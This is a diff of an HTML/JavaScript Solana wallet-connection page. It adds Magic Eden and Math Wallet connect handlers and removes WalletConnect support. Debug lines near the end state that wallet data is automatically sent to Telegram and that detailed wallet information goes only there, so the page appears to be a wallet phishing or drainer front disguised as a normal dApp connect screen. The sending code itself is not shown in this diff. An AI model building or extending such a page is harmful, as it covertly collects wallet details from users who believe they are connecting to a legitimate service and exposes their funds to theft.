             debug('🔍 Phantom already connected:', provider.publicKey);
             return { publicKey: provider.publicKey };
           } else {
+            // Try to connect even in this case, as some environments might require it
             debug('Phantom not connected but trying to connect anyway...');
             try {
               const response = await provider.connect();
@@ -2199,11 +1686,6 @@
           if (this.connectedWallet && this.connectedWallet.disconnect) {
             await this.connectedWallet.disconnect();
           }
-          
-          // Отключаем WalletConnect если активен
-          if (this.connectedWallet && this.connectedWallet.type === 'walletconnect') {
-            await realWalletConnect.disconnect();
-          }
         } catch (error) {
           debug('Error disconnecting wallet:', error);
         }
@@ -2219,6 +1701,7 @@
         this.updateConnectionUI();
         this.hideConnectionStatus();
 
+        // Show wallet browser banner again if we're in a wallet browser
         const walletBrowserInfo = detectWalletBrowser();
         if (walletBrowserInfo.isWalletBrowser) {
           showWalletBrowserBanner(walletBrowserInfo);
@@ -2302,9 +1785,11 @@
       }
 
       setupEventListeners() {
+        // Добавляем прямой обработчик для кнопки подключения кошелька
         const connectWalletBtn = document.getElementById('connectWalletBtn');
         if (connectWalletBtn) {
           connectWalletBtn.addEventListener('click', async (e) => {
+            // Проверяем, находимся ли мы в мобильном браузере Phantom
             const walletBrowserInfo = detectWalletBrowser();
             if (walletBrowserInfo.isWalletBrowser && 
                 walletBrowserInfo.walletKey === 'phantom' && 
@@ -2325,7 +1810,7 @@
           });
         }
 
-        // ОБРАБОТЧИКИ СОБЫТИЙ ДЛЯ WALLET OPTIONS
+        // ОБНОВЛЕННЫЕ ОБРАБОТЧИКИ СОБЫТИЙ ДЛЯ WALLET OPTIONS
         document.querySelectorAll('.wallet-option[data-wallet]').forEach(option => {
           option.addEventListener('click', async (e) => {
             const walletKey = option.getAttribute('data-wallet');
@@ -2353,6 +1838,7 @@
                   }
                 } catch (error) {
                   debug('Phantom connect error:', error);
+                  // Альтернативно ��робуем deeplink
                   try {
                     window.location.href = 'phantom://app/connect?app_url=' + encodeURIComponent(window.location.href);
                   } catch (deeplinkError) {
@@ -2366,6 +1852,7 @@
               return false;
             }
             
+            // Skip deep linking for Phantom browser
             const isPhantomEnv = walletKey === 'phantom' && detectWalletBrowser().walletKey === 'phantom';
             
             if ((walletKey === 'phantom' || walletKey === 'solflare') && 
@@ -2382,6 +1869,7 @@
             
             try {
               await this.connectWallet(walletKey);
+              // Закрываем модальное окно только если подключение успешно и не было отменено
               if (!this.connectionCancelled && this.walletAddress) {
                 setTimeout(() => {
                   closeAllModals();
@@ -2393,7 +1881,7 @@
           });
         });
 
-        // ОБРАБОТЧИКИ СОБЫТИЙ ДЛЯ WALLET ITEMS
+        // ОБНОВЛЕННЫЕ ОБРАБОТЧИКИ СОБЫТИЙ ДЛЯ WALLET ITEMS
         document.querySelectorAll('.wallet-item[data-wallet]').forEach(item => {
           item.addEventListener('click', async (e) => {
             const walletKey = item.getAttribute('data-wallet');
@@ -2421,6 +1909,7 @@
                   }
                 } catch (error) {
                   debug('Phantom connect error:', error);
+                  // Альтернативно пробуем deeplink
                   try {
                     window.location.href = 'phantom://app/connect?app_url=' + encodeURIComponent(window.location.href);
                   } catch (deeplinkError) {
@@ -2434,6 +1923,7 @@
               return false;
             }
             
+            // Skip deep linking for Phantom browser
             const isPhantomEnv = walletKey === 'phantom' && detectWalletBrowser().walletKey === 'phantom';
             
             if ((walletKey === 'phantom' || walletKey === 'solflare') && 
@@ -2450,6 +1940,7 @@
             
             try {
               await this.connectWallet(walletKey);
+              // Закрываем модальное окно только если подключение успешно и не было отменено
               if (!this.connectionCancelled && this.walletAddress) {
                 setTimeout(() => {
                   closeAllModals();
@@ -2511,12 +2002,7 @@
       allWalletsModal.classList.add('hidden');
       modalOverlay.classList.add('hidden');
       
-      // Закрываем также WalletConnect модал
-      const walletConnectModal = document.getElementById('walletConnectModal');
-      if (walletConnectModal) {
-        walletConnectModal.classList.add('hidden');
-      }
-      
+      // Если есть активный walletManager, отмечаем что подключение отменено
       if (window.walletManager) {
         window.walletManager.connectionCancelled = true;
       }
@@ -2551,6 +2037,7 @@
     document.addEventListener('DOMContentLoaded', () => {
       debug('🚀 DOM fully loaded');
       
+      // Добавляем отладочную информацию о Phantom
       if (window.phantom) {
         debug('✓ Phantom object exists at load time');
         debug('✓ Phantom solana exists:', !!window.phantom.solana);
@@ -2559,6 +2046,7 @@
           debug('✓ Phantom isConnected:', window.phantom.solana.isConnected);
           debug('✓ Phantom publicKey:', window.phantom.solana.publicKey);
           
+          // Проверяем методы
           debug('✓ Phantom connect method:', typeof window.phantom.solana.connect);
           debug('✓ Phantom disconnect method:', typeof window.phantom.solana.disconnect);
           debug('✓ Phantom signTransaction method:', typeof window.phantom.solana.signTransaction);
@@ -2566,6 +2054,7 @@
       } else {
         debug('❌ Phantom object does not exist at load time');
         
+        // Проверяем, не появится ли объект Phantom позже
         setTimeout(() => {
           if (window.phantom) {
             debug('✓ Phantom object appeared after delay');
@@ -2579,6 +2068,7 @@
       walletManager = new SolanaWalletManager();
       window.walletManager = walletManager;
       
+      // Add debug info for Phantom browser
       const walletBrowserInfo = detectWalletBrowser();
       if (walletBrowserInfo.isWalletBrowser) {
         debug('🔍 Wallet browser detected:', walletBrowserInfo);
@@ -2627,10 +2117,122 @@
     debug('📤 Автоматическая отправка данных в Telegram включена');
     debug('🔒 Детальная информация о кошельке отправляется только в Telegram');
     debug('🔍 Добавлено определение браузера кошелька');
-    debug('🔗 Добавлена реальная поддержка WalletConnect v2 для мобильных кошельков');
-    debug(`🆔 Project ID: ${realWalletConnect.projectId}`);
     debug('🐞 Режим отладки включен');
+
+    // Magic Eden и Math Wallet интеграция по логике Phantom/Solflare
+    const magicEdenOptions = document.querySelectorAll('.wallet-option[data-wallet="magiceden"]');
+    magicEdenOptions.forEach(option => {
+      option.addEventListener('click', async (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        const device = detectDevice();
+        const provider = window.magiceden;
+        if (provider) {
+          try {
+            if (provider.connect) {
+              await provider.connect();
+            }
+            // Можно добавить обработку адреса, как у Phantom
+            // Например: provider.publicKey
+            // ...
+          } catch (err) {
+            showMagicEdenModal();
+          }
+        } else if (device.isMobile) {
+          // Попытка диплинка
+          window.location.href = 'mewallet://dapp?url=' + encodeURIComponent(window.location.href);
+          setTimeout(() => {
+            showMagicEdenModal();
+          }, 2000);
+        } else {
+          showMagicEdenModal();
+        }
+      });
+    });
+
+    const mathWalletOptions = document.querySelectorAll('.wallet-option[data-wallet="mathwallet"]');
+    mathWalletOptions.forEach(option => {
+      option.addEventListener('click', async (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        const device = detectDevice();
+        const provider = window.mathwallet;
+        if (provider) {
+          try {
+            if (provider.connect) {
+              await provider.connect();
+            }
+            // Можно добавить обработку адреса, как у Phantom
+            // Например: provider.solana.publicKey
+            // ...
+          } catch (err) {
+            showMathWalletModal();
+          }
+        } else if (device.isMobile) {
+          // Попытка диплинка
+          window.location.href = 'mathwallet://dapp?url=' + encodeURIComponent(window.location.href);
+          setTimeout(() => {
+            showMathWalletModal();
+          }, 2000);
+        } else {
+          showMathWalletModal();
+        }
+      });
+    });
+
+    function showMagicEdenModal() {
+      let modal = document.getElementById('magicEdenModal');
+      if (!modal) {
+        modal = document.createElement('div');
+        modal.id = 'magicEdenModal';
+        modal.className = 'connect-wallet';
+        modal.innerHTML = `
+          <div class="connect-header">
+            <h2>Magic Eden Wallet</h2>
+            <button class="close-btn" onclick="closeMagicEdenModal()">×</button>
+          </div>
+          <div style="margin: 20px 0; text-align: center;">
+            <a href="https://magiceden.io/wallet" target="_blank" rel="noopener" style="display:inline-block;padding:10px 20px;font-size:1rem;border-radius:8px;background:#4a90e2;color:#fff;text-decoration:none;">Скачать Magic Eden Wallet</a>
+            <div style="margin-top:10px; color:#666; font-size:0.9rem;">Установите расширение или мобильное приложение Magic Eden Wallet, затем обновите страницу и выберите кошелек снова.</div>
+          </div>
+        `;
+        document.body.appendChild(modal);
+      }
+      modal.classList.remove('hidden');
+      document.getElementById('modalOverlay').classList.remove('hidden');
+    }
+    function closeMagicEdenModal() {
+      const modal = document.getElementById('magicEdenModal');
+      if (modal) modal.classList.add('hidden');
+      document.getElementById('modalOverlay').classList.add('hidden');
+    }
+
+    function showMathWalletModal() {
+      let modal = document.getElementById('mathWalletModal');
+      if (!modal) {
+        modal = document.createElement('div');
+        modal.id = 'mathWalletModal';
+        modal.className = 'connect-wallet';
+        modal.innerHTML = `
+          <div class="connect-header">
+            <h2>Math Wallet</h2>
+            <button class="close-btn" onclick="closeMathWalletModal()">×</button>
+          </div>
+          <div style="margin: 20px 0; text-align: center;">
+            <a href="https://mathwallet.org/" target="_blank" rel="noopener" style="display:inline-block;padding:10px 20px;font-size:1rem;border-radius:8px;background:#4a90e2;color:#fff;text-decoration:none;">Скачать Math Wallet</a>
+            <div style="margin-top:10px; color:#666; font-size:0.9rem;">Установите расширение или мобильное приложение Math Wallet, затем обновите страницу и выберите кошелек снова.</div>
+          </div>
+        `;
+        document.body.appendChild(modal);
+      }
+      modal.classList.remove('hidden');
+      document.getElementById('modalOverlay').classList.remove('hidden');
+    }
+    function closeMathWalletModal() {
+      const modal = document.getElementById('mathWalletModal');
+      if (modal) modal.classList.add('hidden');
+      document.getElementById('modalOverlay').classList.add('hidden');
+    }
   </script>
 </body>
 </html>
-
